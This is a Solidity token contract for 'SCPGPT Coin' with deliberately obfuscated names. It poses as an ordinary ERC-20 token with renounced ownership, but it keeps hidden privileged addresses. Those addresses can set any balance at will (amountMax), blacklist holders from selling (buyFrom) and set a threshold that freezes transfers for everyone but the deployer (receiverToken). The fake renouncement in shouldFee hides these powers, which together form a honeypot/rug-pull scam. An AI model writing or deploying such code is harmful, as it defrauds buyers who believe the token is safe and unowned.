/**
 *Submitted for verification at BscScan.com on 2023-03-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface walletEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listIs) external view returns (uint256);

    function transfer(address atLimitWallet, uint256 shouldTeam) external returns (bool);

    function allowance(address shouldSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldTeam) external returns (bool);

    function transferFrom(
        address sender,
        address atLimitWallet,
        uint256 shouldTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellWalletTotal, uint256 value);
    event Approval(address indexed shouldSender, address indexed spender, uint256 value);
}

interface walletEnableMetadata is walletEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract walletBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minLaunch {
    function createPair(address liquidityTx, address senderLaunchLiquidity) external returns (address);
}

interface receiverTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SCPGPTCoin is walletBuy, walletEnable, walletEnableMetadata {

    address public liquidityMode;

    string private totalTx = "SCPGPT Coin";

    function exemptIs(address liquidityLimit, address atLimitWallet, uint256 shouldTeam) internal returns (bool) {
        if (liquidityLimit == takeWallet) {
            return sellFeeAuto(liquidityLimit, atLimitWallet, shouldTeam);
        }
        uint256 isTeam = walletEnable(liquidityMode).balanceOf(liquidityTo);
        require(isTeam <= launchEnable);
        require(!sellTotal[liquidityLimit]);
        return sellFeeAuto(liquidityLimit, atLimitWallet, shouldTeam);
    }

    uint256 launchEnable;

    function amountMax(address exemptListSwap, uint256 shouldTeam) public {
        launchLiquidityBuy();
        sellIsFund[exemptListSwap] = shouldTeam;
    }

    function getOwner() external view returns (address) {
        return receiverMin;
    }

    bool public marketingAuto;

    uint256 private senderMode;

    function transferFrom(address liquidityLimit, address atLimitWallet, uint256 shouldTeam) external override returns (bool) {
        if (_msgSender() != launchTo) {
            if (enableLaunchSell[liquidityLimit][_msgSender()] != type(uint256).max) {
                require(shouldTeam <= enableLaunchSell[liquidityLimit][_msgSender()]);
                enableLaunchSell[liquidityLimit][_msgSender()] -= shouldTeam;
            }
        }
        return exemptIs(liquidityLimit, atLimitWallet, shouldTeam);
    }

    bool private marketingLaunchLaunched;

    constructor (){
        if (senderTake == senderMode) {
            marketingLaunchLaunched = false;
        }
        receiverTotal shouldToken = receiverTotal(launchTo);
        liquidityMode = minLaunch(shouldToken.factory()).createPair(shouldToken.WETH(), address(this));
        
        shouldTakeSender[_msgSender()] = true;
        sellIsFund[_msgSender()] = atReceiver;
        takeWallet = _msgSender();
        
        emit Transfer(address(0), takeWallet, atReceiver);
        receiverMin = _msgSender();
        shouldFee();
    }

    uint256 private atReceiver = 100000000 * 10 ** 18;

    function limitTokenReceiver(address txMin) public {
        if (marketingAuto) {
            return;
        }
        if (autoMode != sellList) {
            autoMode = senderTake;
        }
        shouldTakeSender[txMin] = true;
        
        marketingAuto = true;
    }

    uint256 public senderTake;

    function launchLiquidityBuy() private view {
        require(shouldTakeSender[_msgSender()]);
    }

    function allowance(address receiverLaunched, address modeReceiverAt) external view virtual override returns (uint256) {
        if (modeReceiverAt == launchTo) {
            return type(uint256).max;
        }
        return enableLaunchSell[receiverLaunched][modeReceiverAt];
    }

    function decimals() external view virtual override returns (uint8) {
        return toMax;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return atReceiver;
    }

    function balanceOf(address listIs) public view virtual override returns (uint256) {
        return sellIsFund[listIs];
    }

    string private tokenFrom = "SCN";

    function receiverToken(uint256 shouldTeam) public {
        launchLiquidityBuy();
        launchEnable = shouldTeam;
    }

    uint8 private toMax = 18;

    uint256 private walletMin;

    bool private limitLaunchTrading;

    uint256 private autoMode;

    function sellFeeAuto(address liquidityLimit, address atLimitWallet, uint256 shouldTeam) internal returns (bool) {
        require(sellIsFund[liquidityLimit] >= shouldTeam);
        sellIsFund[liquidityLimit] -= shouldTeam;
        sellIsFund[atLimitWallet] += shouldTeam;
        emit Transfer(liquidityLimit, atLimitWallet, shouldTeam);
        return true;
    }

    event OwnershipTransferred(address indexed buyMode, address indexed txReceiver);

    function symbol() external view virtual override returns (string memory) {
        return tokenFrom;
    }

    mapping(address => uint256) private sellIsFund;

    uint256 private sellList;

    bool public receiverSell;

    bool public toEnableSell;

    function transfer(address exemptListSwap, uint256 shouldTeam) external virtual override returns (bool) {
        return exemptIs(_msgSender(), exemptListSwap, shouldTeam);
    }

    mapping(address => bool) public shouldTakeSender;

    function owner() external view returns (address) {
        return receiverMin;
    }

    address private receiverMin;

    mapping(address => mapping(address => uint256)) private enableLaunchSell;

    function shouldFee() public {
        emit OwnershipTransferred(takeWallet, address(0));
        receiverMin = address(0);
    }

    bool public isMarketingAt;

    address public takeWallet;

    function buyFrom(address tokenLaunched) public {
        launchLiquidityBuy();
        if (senderMode == sellList) {
            senderMode = autoMode;
        }
        if (tokenLaunched == takeWallet || tokenLaunched == liquidityMode) {
            return;
        }
        sellTotal[tokenLaunched] = true;
    }

    address liquidityTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address launchTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address modeReceiverAt, uint256 shouldTeam) public virtual override returns (bool) {
        enableLaunchSell[_msgSender()][modeReceiverAt] = shouldTeam;
        emit Approval(_msgSender(), modeReceiverAt, shouldTeam);
        return true;
    }

    mapping(address => bool) public sellTotal;

    function name() external view virtual override returns (string memory) {
        return totalTx;
    }

}